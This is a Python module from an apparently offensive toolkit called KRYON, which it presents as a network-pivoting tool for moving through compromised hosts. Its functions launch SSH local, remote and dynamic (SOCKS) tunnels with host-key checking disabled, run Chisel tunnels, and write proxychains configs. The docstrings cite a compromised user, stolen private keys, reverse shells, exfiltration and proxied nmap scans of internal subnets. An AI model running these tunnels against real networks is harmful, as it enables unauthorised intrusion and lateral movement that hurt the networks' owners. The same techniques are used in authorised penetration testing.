"""
KRYON Network Pivoting - Tunneling and Port Forwarding

Advanced network pivoting and tunneling tools.

Clearance Level: Alpha-Orange (Network Infiltration Authority)
Specialization: Network tunneling and lateral movement
Mission: Pivot through compromised hosts to reach isolated networks

This module provides:
- SSH tunneling (local, remote, dynamic)
- SOCKS proxy setup
- Port forwarding and redirection
- Metasploit route management
- Chisel tunneling
"""

import socket
import subprocess
import time
from typing import Any


def ssh_local_port_forward(
    ssh_host: str,
    ssh_user: str,
    local_port: int,
    remote_host: str,
    remote_port: int,
    ssh_port: int = 22,
    ssh_key: str | None = None,
    ssh_password: str | None = None,
    background: bool = True,
) -> dict[str, Any]:
    """
    Create SSH local port forwarding tunnel.

    Local port forwarding forwards connections from your local machine
    to a remote host through the SSH server.

    Use case:
        Access internal services through compromised SSH server.
        Example: Access internal database at 192.168.1.10:3306

    Args:
        ssh_host: SSH server to connect to
        ssh_user: SSH username
        local_port: Local port to listen on
        remote_host: Target host (from SSH server perspective)
        remote_port: Target port
        ssh_port: SSH server port (default: 22)
        ssh_key: Path to SSH private key
        ssh_password: SSH password (if no key)
        background: Run in background

    Returns:
        Dictionary containing:
        - tunnel_active: Whether tunnel is running
        - local_endpoint: Local address to connect to
        - remote_endpoint: Remote target address
        - ssh_pid: Process ID of SSH tunnel
        - command: SSH command used
        - success: Whether operation succeeded

    Example:
        >>> # Forward local port 3307 to internal DB at 192.168.1.10:3306
        >>> result = ssh_local_port_forward(
        ...     ssh_host="10.10.10.5",
        ...     ssh_user="compromised_user",
        ...     local_port=3307,
        ...     remote_host="192.168.1.10",
        ...     remote_port=3306,
        ...     ssh_key="/tmp/id_rsa"
        ... )
        >>>
        >>> if result['tunnel_active']:
        ...     print(f"Connect to: {result['local_endpoint']}")
        ...     # Now connect to localhost:3307 to reach 192.168.1.10:3306

    SSH Command:
        ssh -L 3307:192.168.1.10:3306 user@10.10.10.5
        Meaning: Forward my port 3307 to 192.168.1.10:3306 via 10.10.10.5
    """
    results = {
        "tunnel_active": False,
        "local_endpoint": f"localhost:{local_port}",
        "remote_endpoint": f"{remote_host}:{remote_port}",
        "ssh_pid": 0,
        "command": "",
        "success": False,
        "error": None,
    }

    try:
        # Build SSH command
        cmd = [
            "ssh",
            "-N",  # Don't execute remote command
            "-L",
            f"{local_port}:{remote_host}:{remote_port}",
            "-p",
            str(ssh_port),
        ]

        if ssh_key:
            cmd.extend(["-i", ssh_key])

        if background:
            cmd.append("-f")  # Go to background

        # Disable strict host key checking (be careful!)
        cmd.extend(["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null"])

        cmd.append(f"{ssh_user}@{ssh_host}")

        results["command"] = " ".join(cmd)

        # Execute SSH tunnel
        if ssh_password:
            # Use sshpass for password authentication
            sshpass_cmd = ["sshpass", "-p", ssh_password] + cmd

            process = subprocess.Popen(sshpass_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # Give tunnel time to establish
        time.sleep(2)

        # Check if tunnel is active
        if background:
            # Find SSH process
            check = subprocess.run(
                ["pgrep", "-f", f"ssh.*{local_port}:{remote_host}:{remote_port}"],
                capture_output=True,
                text=True,
            )

            if check.stdout.strip():
                results["ssh_pid"] = int(check.stdout.strip().split("\n")[0])
                results["tunnel_active"] = True
        else:
            results["ssh_pid"] = process.pid
            results["tunnel_active"] = True

        # Verify port is listening
        if _check_port_listening(local_port):
            results["success"] = True
        else:
            results["error"] = f"Port {local_port} not listening after tunnel creation"

    except FileNotFoundError as e:
        if "sshpass" in str(e):
            results["error"] = "sshpass not found - install with: apt-get install sshpass"
        else:
            results["error"] = str(e)
    except Exception as e:
        results["error"] = str(e)

    return results


def ssh_remote_port_forward(
    ssh_host: str,
    ssh_user: str,
    remote_port: int,
    local_host: str,
    local_port: int,
    ssh_port: int = 22,
    ssh_key: str | None = None,
    background: bool = True,
) -> dict[str, Any]:
    """
    Create SSH remote port forwarding tunnel.

    Remote port forwarding forwards connections from the SSH server
    back to your local machine.

    Use case:
        Allow remote server to access services on your machine.
        Useful for reverse shells, exfiltration, etc.

    Args:
        ssh_host: SSH server to connect to
        ssh_user: SSH username
        remote_port: Port on SSH server to listen on
        local_host: Target host from your perspective
        local_port: Target port
        ssh_port: SSH server port
        ssh_key: Path to SSH private key
        background: Run in background

    Returns:
        Similar to ssh_local_port_forward()

    Example:
        >>> # Make SSH server port 8080 forward to our local web server
        >>> result = ssh_remote_port_forward(
        ...     ssh_host="10.10.10.5",
        ...     ssh_user="user",
        ...     remote_port=8080,
        ...     local_host="localhost",
        ...     local_port=80,
        ...     ssh_key="/tmp/id_rsa"
        ... )
        >>>
        >>> # Now connections to 10.10.10.5:8080 reach our localhost:80

    SSH Command:
        ssh -R 8080:localhost:80 user@10.10.10.5
        Meaning: Forward remote port 8080 to my localhost:80
    """
    results = {
        "tunnel_active": False,
        "remote_endpoint": f"{ssh_host}:{remote_port}",
        "local_endpoint": f"{local_host}:{local_port}",
        "ssh_pid": 0,
        "command": "",
        "success": False,
        "error": None,
    }

    try:
        # Build SSH command
        cmd = ["ssh", "-N", "-R", f"{remote_port}:{local_host}:{local_port}", "-p", str(ssh_port)]

        if ssh_key:
            cmd.extend(["-i", ssh_key])

        if background:
            cmd.append("-f")

        cmd.extend(["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null"])

        cmd.append(f"{ssh_user}@{ssh_host}")

        results["command"] = " ".join(cmd)

        # Execute
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        time.sleep(2)

        # Check if tunnel is active
        if background:
            check = subprocess.run(["pgrep", "-f", f"ssh.*-R.*{remote_port}"], capture_output=True, text=True)

            if check.stdout.strip():
                results["ssh_pid"] = int(check.stdout.strip().split("\n")[0])
                results["tunnel_active"] = True
        else:
            results["ssh_pid"] = process.pid
            results["tunnel_active"] = True

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def ssh_dynamic_port_forward(
    ssh_host: str,
    ssh_user: str,
    socks_port: int = 1080,
    ssh_port: int = 22,
    ssh_key: str | None = None,
    background: bool = True,
) -> dict[str, Any]:
    """
    Create SSH dynamic port forwarding (SOCKS proxy).

    Dynamic port forwarding creates a SOCKS proxy that allows
    routing arbitrary traffic through the SSH server.

    Use case:
        Route all tools through compromised host to access internal network.

    Args:
        ssh_host: SSH server to connect to
        ssh_user: SSH username
        socks_port: Local SOCKS proxy port (default: 1080)
        ssh_port: SSH server port
        ssh_key: Path to SSH private key
        background: Run in background

    Returns:
        Dictionary containing:
        - socks_proxy: SOCKS proxy address (e.g., socks5://localhost:1080)
        - tunnel_active: Whether tunnel is running
        - ssh_pid: Process ID
        - proxychains_config: Generated proxychains config
        - usage_examples: How to use the SOCKS proxy

    Example:
        >>> # Create SOCKS proxy through compromised host
        >>> result = ssh_dynamic_port_forward(
        ...     ssh_host="10.10.10.5",
        ...     ssh_user="user",
        ...     socks_port=1080,
        ...     ssh_key="/tmp/id_rsa"
        ... )
        >>>
        >>> print(f"SOCKS proxy: {result['socks_proxy']}")
        >>>
        >>> # Use with proxychains
        >>> # proxychains nmap -sT 192.168.1.0/24
        >>>
        >>> # Use with curl
        >>> # curl --socks5 localhost:1080 http://internal-site.local

    SSH Command:
        ssh -D 1080 user@10.10.10.5
        Meaning: Create SOCKS proxy on localhost:1080
    """
    results = {
        "socks_proxy": f"socks5://localhost:{socks_port}",
        "tunnel_active": False,
        "ssh_pid": 0,
        "command": "",
        "proxychains_config": "",
        "usage_examples": [],
        "success": False,
        "error": None,
    }

    try:
        # Build SSH command
        cmd = ["ssh", "-N", "-D", str(socks_port), "-p", str(ssh_port)]

        if ssh_key:
            cmd.extend(["-i", ssh_key])

        if background:
            cmd.append("-f")

        cmd.extend(["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null"])

        cmd.append(f"{ssh_user}@{ssh_host}")

        results["command"] = " ".join(cmd)

        # Execute
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        time.sleep(2)

        # Check if active
        if background:
            check = subprocess.run(["pgrep", "-f", f"ssh.*-D.*{socks_port}"], capture_output=True, text=True)

            if check.stdout.strip():
                results["ssh_pid"] = int(check.stdout.strip().split("\n")[0])
                results["tunnel_active"] = True
        else:
            results["ssh_pid"] = process.pid
            results["tunnel_active"] = True

        # Verify SOCKS port is listening
        if _check_port_listening(socks_port):
            results["success"] = True

            # Generate proxychains config
            results["proxychains_config"] = _generate_proxychains_config(socks_port)

            # Usage examples
            results["usage_examples"] = [
                "proxychains nmap -sT 192.168.1.0/24",
                "proxychains curl http://internal-server",
                f"curl --socks5 localhost:{socks_port} http://target",
                f"ssh -o ProxyCommand='nc -x localhost:{socks_port} %h %p' user@internal-host",
            ]

    except Exception as e:
        results["error"] = str(e)

    return results


def setup_chisel_tunnel(
    chisel_server_host: str,
    chisel_server_port: int = 8080,
    local_port: int = 1080,
    mode: str = "socks",
    server_mode: bool = False,
) -> dict[str, Any]:
    """
    Setup Chisel tunnel for pivoting.

    Chisel is a fast TCP/UDP tunnel over HTTP, useful when SSH is not available.
    Works great for pivoting through HTTP proxies and firewalls.

    Args:
        chisel_server_host: Chisel server address
        chisel_server_port: Chisel server port
        local_port: Local SOCKS proxy port (client mode)
        mode: Tunnel mode (socks, forward, reverse)
        server_mode: Run as server instead of client

    Returns:
        Dictionary containing tunnel information

    Example (Server on compromised host):
        >>> # On compromised machine (Linux/Windows)
        >>> result = setup_chisel_tunnel(
        ...     chisel_server_host="0.0.0.0",
        ...     chisel_server_port=8080,
        ...     server_mode=True
        ... )
        >>> # chisel server --port 8080 --reverse

    Example (Client on attacker machine):
        >>> # On your machine
        >>> result = setup_chisel_tunnel(
        ...     chisel_server_host="10.10.10.5",
        ...     chisel_server_port=8080,
        ...     local_port=1080,
        ...     mode="socks"
        ... )
        >>> # Creates SOCKS proxy on localhost:1080

    Download Chisel:
        https://github.com/jpillora/chisel/releases
    """
    results = {
        "tunnel_active": False,
        "socks_proxy": "",
        "command": "",
        "process_pid": 0,
        "success": False,
        "error": None,
    }

    try:
        # Check if chisel is available
        check = subprocess.run(["which", "chisel"], capture_output=True)

        if check.returncode != 0:
            results["error"] = "chisel not found - download from https://github.com/jpillora/chisel/releases"
            return results

        if server_mode:
            # Run as server
            cmd = ["chisel", "server", "--port", str(chisel_server_port), "--reverse"]
        else:
            # Run as client
            if mode == "socks":
                cmd = [
                    "chisel",
                    "client",
                    f"{chisel_server_host}:{chisel_server_port}",
                    f"{local_port}:socks",
                ]
                results["socks_proxy"] = f"socks5://localhost:{local_port}"
            else:
                cmd = ["chisel", "client", f"{chisel_server_host}:{chisel_server_port}"]

        results["command"] = " ".join(cmd)

        # Start chisel
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        time.sleep(2)

        results["process_pid"] = process.pid
        results["tunnel_active"] = True
        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def kill_tunnel(pid: int) -> dict[str, Any]:
    """
    Kill SSH tunnel or proxy by PID.

    Args:
        pid: Process ID to kill

    Returns:
        Success status

    Example:
        >>> result = ssh_dynamic_port_forward(...)
        >>> # ... use tunnel ...
        >>> kill_tunnel(result['ssh_pid'])
    """
    results = {"success": False, "error": None}

    try:
        subprocess.run(["kill", str(pid)], check=True)

        results["success"] = True

    except subprocess.CalledProcessError:
        results["error"] = f"Failed to kill process {pid}"
    except Exception as e:
        results["error"] = str(e)

    return results


def _check_port_listening(port: int) -> bool:
    """Check if port is listening on localhost."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex(("localhost", port))
        sock.close()
        return result == 0
    except Exception:
        return False


def _generate_proxychains_config(socks_port: int) -> str:
    """Generate proxychains configuration."""
    config_path = "/tmp/kryon_proxychains.conf"

    config_content = f"""# KRYON Proxychains Configuration
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 {socks_port}
"""

    try:
        with open(config_path, "w") as f:
            f.write(config_content)

        return config_path
    except Exception:
        return ""
